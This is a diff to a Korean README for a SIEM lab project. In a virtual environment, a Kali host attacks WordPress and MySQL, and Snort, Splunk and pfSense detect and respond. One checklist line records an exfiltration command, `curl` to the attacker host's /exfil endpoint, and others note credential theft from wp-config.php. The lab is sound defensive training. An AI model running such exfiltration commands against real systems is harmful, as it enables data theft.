@@ -1,5 +1,7 @@
 # SIEM 공격 탐지 및 대응 실습 프로젝트
 
+> 최신 문서 기준과 검증 대기 항목: [품질 점검 기록](phase4-soc/quality-audit.md). 설정 적용·재시험 완료를 의미하지 않습니다.
+
 > 통합보안관제 가상환경에서 공격 수행 → 탐지/분석 → 관제 대응까지 전체 사이클 실습
 
 > 📖 참고자료: [공격유형 사전조사 (개념·표적·방어·탐지·오탐정탐)](공격유형-사전조사.md)
@@ -220,11 +222,11 @@ Kali   (10.50.50.30) ─┘                                  │
 - [x] DB 접근 — wp-config.php 인증정보로 MySQL 접근 (T1213)
   - [x] DMZ→Inner-net MySQL 접근 성공, 테이블 목록 및 wp_users 데이터 탈취
   - [x] admin / admin@techsolution.local / bcrypt 해시 획득
-- [x] 유출 시도 — 외부 전송 시도 + 차단 확인 (T1041)
-  - [x] `curl http://10.50.50.30:8888/exfil` → Connection refused (유출 실패)
+- [x] 유출 시도 — 외부 전송 실패 확인 (원인 미확정) (T1041)
+  - [x] `curl http://10.50.50.30:8888/exfil` → Connection refused (별도 전송 실패, 차단 원인 미확정)
 
 **탐지 엔지니어링**
-- [x] 커스텀 Snort 룰 탐지 테스트 (9개 룰 → 4개 탐지, 5개 미탐지 — 공격 경로 차이 분석 완료)
+- [x] 커스텀 Snort 룰 탐지 테스트 (9개 룰 → 4개 SID 발생 확인, 나머지는 미시험·경로 불일치 구분 필요 — 공격 경로 차이 분석 완료)
 - [x] Splunk 상관분석 쿼리 구축 (7종: 브루트포스 교차, SQLi 교차, 웹쉘 시퀀스, 킬체인 타임라인, DB 이상, Alert 설정, 위험 스코어링)
 - [x] 탐지 개선 전/후 비교표 작성 (ET Open vs 커스텀 + 시그니처 IDS 구조적 한계 분석)
 - [x] 정탐/오탐 판별 기록 (정탐 4건 + False Negative 분석 4건 + 오탐 가능성 검토 4건)
@@ -232,7 +234,7 @@ Kali   (10.50.50.30) ─┘                                  │
 ### Phase 4. 관제 운영 (SOC 시뮬레이션)
 
 **모니터링 체계 구축**
-- [x] Splunk 대시보드 구축 (SOC_Monitor, 7개 패널 3단 레이아웃: events, time, att_type, att_ip, waf, alerts, db_approach, login_history)
+- [x] Splunk 대시보드 구축 (SOC_Monitor, 8개 패널 3단 레이아웃: events, time, att_type, att_ip, waf, alerts, db_approach, login_history)
 - [x] Splunk Alert 설정 (브루트포스, 스캐너, SQLi, 웹쉘, WAF 급증 — Phase 3 실제 탐지 데이터 기반)
 
 **관제 대응**
@@ -240,14 +242,14 @@ Kali   (10.50.50.30) ─┘                                  │
   - [x] 킬체인 공격 실시간 대응 (Kali 공격 ↔ mng-mint 관제, 2026-08-27 18:49~19:40)
   - [x] 정탐/오탐 판별 (정상 트래픽 vs 공격 트래픽 구분)
 - [x] 차단 검증 — pfSense WAN Block 룰(10.50.50.30) 후 재공격 → curl 타임아웃 + WPScan Aborted 확인
-- [x] MITRE ATT&CK 매핑 + 킬체인 분석 다이어그램 (7단계 중 5단계 완전탐지, 1단계 부분탐지, 1단계 차단)
+- [x] MITRE ATT&CK 매핑 + 킬체인 분석 다이어그램 (7단계 중 5단계 공격 시도 탐지, 1단계 부분탐지, 1단계 외부 전송 실패 (원인 미확정))
 
 **보고**
 - [x] 관제 일지 작성 (INC-001~INC-006, `phase4-soc/incident-log.md`)
 - [x] 최종 보고서 작성 (`phase4-soc/final-report.md`)
   - [x] Executive Summary (경영진용)
   - [x] 공격 분석 (킬체인 7단계 + MITRE ATT&CK 매핑)
-  - [x] 탐지 현황 (Alert 7건 트리거, 탐지 커버리지 5/7)
+  - [x] 탐지 현황 (Alert 8건 트리거, 탐지 커버리지 5/7)
   - [x] 대응 조치 (IP 차단 + 검증) + 개선 권고 (6-1~6-3)
   - [x] 부록: IOC 목록, Splunk 쿼리 모음, 관제 일지 요약
   - [x] SOC 분석가 사고 확장 (STRIDE/PASTA, IP 평판, EDR 연계, AI 활용)
@@ -292,8 +294,8 @@ project/
 | 공격 실행 기록 (Bee-box) | `phase1-attack/README.md` | **완료** (R-1~R-4, E-1~E-7) |
 | Splunk 분석 + 방화벽 정책 | `phase2-detect/README.md` | **완료** (1차·2차·3차 대응) |
 | 환경 확장 설계서 | `프로젝트-확장방향.md` | **완료** |
-| 환경 구축 스크립트·설정 | `phase2.5-setup/` | **진행 중** (WP+MySQL+WAF+rsyslog 완료, 인덱스·필드추출 미완) |
+| 환경 구축 스크립트·설정 | `phase2.5-setup/` | **구축 기록 있음 / 배포 설정 동기화 대기** (rsyslog 실제 설정, 필드 추출·룰 백업 필요) |
 | 킬체인 공격 기록 | `phase3-killchain/README.md` | **완료** (7단계 킬체인 + 탐지 엔지니어링) |
-| SOC 대시보드 + Alert + 관제 대응 | `phase4-soc/README.md` | **완료** (대시보드 7패널 + Alert 5개 + 킬체인 대응 + MITRE 매핑) |
+| SOC 대시보드 + Alert + 관제 대응 | `phase4-soc/README.md` | **완료** (대시보드 8패널 + Alert 5개 + 킬체인 대응 + MITRE 매핑) |
 | 관제 일지 | `phase4-soc/incident-log.md` | **완료** (INC-001~INC-006) |
 | 최종 보고서 | `phase4-soc/final-report.md` | **완료** (8장: 요약+인프라+공격+탐지+대응+개선+부록+사고확장) |
